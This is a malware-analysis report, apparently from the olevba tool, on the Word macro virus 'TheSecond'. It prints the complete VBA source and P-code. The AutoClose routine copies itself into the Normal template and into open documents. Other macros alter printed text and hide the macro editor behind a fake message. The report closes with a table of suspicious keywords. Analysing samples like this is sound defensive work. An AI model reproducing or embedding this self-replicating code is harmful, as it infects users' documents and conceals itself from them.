olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.TheSecond.m
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.TheSecond.m - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO TheSecond.bas 
in file: Virus.MSWord.TheSecond.m - OLE stream: 'Macros/VBA/TheSecond'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
  
  
  flag = False
  If Documents.Count >= 1 Then
    counter = NormalTemplate.VBProject.VBComponents.Count
    For I = 1 To counter
      If NormalTemplate.VBProject.VBComponents.Item(I).Name = "TheSecond" Then flag = True
    Next I
    x = Application.StartupPath + "\TheSecond.tmp"
    If Not flag Then
      ActiveDocument.VBProject.VBComponents("TheSecond").Export (x)
      NormalTemplate.VBProject.VBComponents.Import (x)
    End If
    flag = False
    infected = False
    havesave = ActiveDocument.Saved
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents.Item(I).Name = "TheSecond" Then flag = True
    Next I
    If Not flag Then
      NormalTemplate.VBProject.VBComponents("TheSecond").Export (x)
      ActiveDocument.VBProject.VBComponents.Import (x)
      infected = True
    End If
    If havesave And infected And (Left(ActiveDocument.Name, 8) <> "Äîêóìåíò") Then
      Dialogs(wdDialogFileSaveAs).Execute
    End If
    ActiveDocument.Saved = havesave
  End If
End Sub
Sub FilePrint()
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = "Íþáèí"
    .Replacement.Text = "Íóäèí"
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
  End With
  Dialogs(wdDialogFilePrint).Show
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = "Íóäèí"
    .Replacement.Text = "Íþáèí"
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
  End With
End Sub
Sub ToolsMacro()
  Dialogs(wdDialogToolsMacro).Display
End Sub
Sub ViewVBCode()
  MsgBox ("Íåò çàãðóæåííûõ ìàêðîñîâ!")
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.TheSecond.m
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/TheSecond - 3449 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' Line #2:
' Line #3:
' 	LitVarSpecial (False)
' 	St flag 
' Line #4:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #5:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St counter 
' Line #6:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld counter 
' 	For 
' Line #7:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "TheSecond"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St flag 
' 	EndIf 
' Line #8:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #9:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000E "\TheSecond.tmp"
' 	Add 
' 	St x 
' Line #10:
' 	Ld flag 
' 	Not 
' 	IfBlock 
' Line #11:
' 	Ld x 
' 	Paren 
' 	LitStr 0x0009 "TheSecond"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #12:
' 	Ld x 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitVarSpecial (False)
' 	St flag 
' Line #15:
' 	LitVarSpecial (False)
' 	St infected 
' Line #16:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St havesave 
' Line #17:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #18:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "TheSecond"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St flag 
' 	EndIf 
' Line #19:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	Ld flag 
' 	Not 
' 	IfBlock 
' Line #21:
' 	Ld x 
' 	Paren 
' 	LitStr 0x0009 "TheSecond"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #22:
' 	Ld x 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #23:
' 	LitVarSpecial (True)
' 	St infected 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	Ld havesave 
' 	Ld infected 
' 	And 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Äîêóìåíò"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #26:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Execute 0x0000 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	Ld havesave 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FilePrint())
' Line #32:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #33:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #34:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #35:
' 	LitStr 0x0005 "Íþáèí"
' 	MemStWith Then 
' Line #36:
' 	LitStr 0x0005 "Íóäèí"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #37:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #38:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #39:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #40:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #41:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #42:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #43:
' 	EndWith 
' Line #44:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #45:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #46:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #47:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #48:
' 	LitStr 0x0005 "Íóäèí"
' 	MemStWith Then 
' Line #49:
' 	LitStr 0x0005 "Íþáèí"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #50:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #51:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #52:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #53:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #54:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #55:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #56:
' 	EndWith 
' Line #57:
' 	EndSub 
' Line #58:
' 	FuncDefn (Sub ToolsMacro())
' Line #59:
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' Line #60:
' 	EndSub 
' Line #61:
' 	FuncDefn (Sub ViewVBCode())
' Line #62:
' 	LitStr 0x0019 "Íåò çàãðóæåííûõ ìàêðîñîâ!"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #63:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

